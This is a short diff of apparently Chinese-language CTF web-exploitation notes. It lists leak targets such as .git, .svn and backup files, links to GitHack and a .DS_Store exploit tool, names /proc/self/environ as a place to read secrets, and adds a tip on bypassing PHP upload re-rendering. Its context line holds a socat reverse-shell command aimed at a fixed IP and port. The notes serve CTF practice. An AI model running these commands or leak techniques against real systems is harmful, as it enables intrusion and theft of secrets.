@@ -17,4 +17,8 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080
 ## 敏感文件
 robots.txt .git .svn .swp ~ .bak 源码，目录泄露
 .git泄露利用EXP:https://github.com/lijiejie/GitHack
+.DS_Store 利用: https://github.com/lijiejie/ds_store_exp
 进程环境变量: /proc/self/environ 
+
+## 上传二次渲染
+有时候上传文件时php会用组件把你的文件格式更改为jpg，需要用/ctf/web/php/php_jpg.php中的脚本进行绕过
